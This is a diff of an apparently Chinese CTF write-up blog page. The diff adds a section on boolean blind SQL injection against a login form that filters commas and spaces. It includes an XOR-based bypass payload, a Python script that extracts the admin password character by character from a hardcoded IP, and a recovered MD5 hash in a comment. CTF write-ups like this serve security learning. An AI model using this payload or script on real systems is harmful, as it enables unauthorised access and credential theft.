@@ -103,7 +103,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/weeksql1.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/weeksql3.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/weeksql2.PNG">
-<meta property="og:updated_time" content="2018-03-13T15:14:15.104Z">
+<meta property="og:updated_time" content="2018-03-16T10:31:51.127Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="近期看的题目">
 <meta name="twitter:description" content="最近看师傅们的博客学到了好多">
@@ -407,6 +407,11 @@
 <p>这里单引号前闭合啥回显都不变 1’ admin’ 猜测是错误值 所以这里用and的话咋都跑不出来</p>
 <p>实际的url是这样的<br><img src="http://otvzfr1o1.bkt.clouddn.com/weeksql3.PNG" alt=""></p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/weeksql2.PNG" alt=""></p>
+<p>###sql盲注 过滤逗号 空格</p>
+<p>登陆框 只有用户名是admin时才会提示密码错误 其他情况下提示用户名不存在</p>
+<p>很明显要直接查password</p>
+<p>username=admin’^(ascii(substr((select(password))from(1)))&gt;127)#&amp;password=1 绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf8 -*-</span></div><div class="line">import requests</div><div class="line">flag = <span class="string">""</span></div><div class="line">url = <span class="string">"http://118.89.219.210:49167/index.php"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(25,500):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(33,127):</div><div class="line">                </div><div class="line">        <span class="comment">#payload ="admin'^(ascii(substr((select(database()))from(%s)))&gt;%s)#"%(i,j)</span></div><div class="line">        payload =<span class="string">"admin'^(ascii(substr((select(password))from(%s)))&gt;%s)#"</span>%(i,j)</div><div class="line"><span class="comment">#51b7a76d51e70b419f60d3473fb6f900 md5</span></div><div class="line">        </div><div class="line">        data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</div><div class="line">        s = requests.post(url,data=data).text</div><div class="line">        <span class="comment">#print "i:",i,"j:",j</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"username does not exist!"</span> not <span class="keyword">in</span> s:</div><div class="line">            flag += chr(j)</div><div class="line">            <span class="built_in">print</span> flag</div><div class="line">            <span class="built_in">break</span></div></pre></td></tr></table></figure>
 
       
     </div>
